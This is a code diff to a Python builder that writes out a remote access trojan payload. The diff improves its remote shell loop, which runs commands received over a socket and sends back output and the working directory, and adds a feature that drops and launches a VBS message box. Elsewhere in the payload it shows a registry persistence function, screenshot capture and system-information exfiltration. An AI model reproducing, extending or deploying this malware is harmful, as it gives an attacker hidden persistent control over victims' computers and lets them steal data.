@@ -36,16 +36,20 @@ def persistence(executable):
         key.Close()        
 while True:
     conn = s.recv(1024).decode('utf-8')
+    if conn == 'shell':
+        s.send(os.getcwd().encode())
     if conn.startswith('shell:'):
         conn = conn[6:]
         if conn[:3] == 'cd ':
-            os.chdir(conn[3:])
-            conn = 'cd'      
-        proc = subprocess.Popen(conn, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, shell=True)
-        stdout, stderr = proc.communicate()
-        cmd = stdout+stderr
-        if len(cmd) == 0:
-            cmd = conn.encode()
+            dir = os.path.expandvars(conn[3:])
+            if os.path.isdir(dir):
+                os.chdir(dir)
+            cmd = b''
+        else:      
+            proc = subprocess.Popen(conn, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, shell=True)
+            stdout, stderr = proc.communicate()
+            cmd = stdout+stderr
+        cmd += str('\\n'+os.getcwd()).encode()
         s.send(cmd)
     if conn == 'screenshot':
         runtime = time.asctime()[11:].replace(' ','-').replace(':','-')
@@ -106,7 +110,11 @@ while True:
         else:
             ARCH = 'x86'
         sysinfo = 'Name          :: {}\\nOS            :: {}\\nArchitecture  :: {}'.format(NAME,OS,ARCH)
-        s.send(sysinfo.encode('Latin_1'))"""
+        s.send(sysinfo.encode('Latin_1'))
+    if conn.startswith('msg:'):
+        msg = conn[4:]
+        payload = 'cd %temp% & echo MsgBox("{}") > tempmsg.vbs & start tempmsg.vbs'.format(msg)
+        p = subprocess.Popen(payload,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, shell=True)"""
     
     with open(file_name,'w') as payload_file:
         payload_file.write(payload)
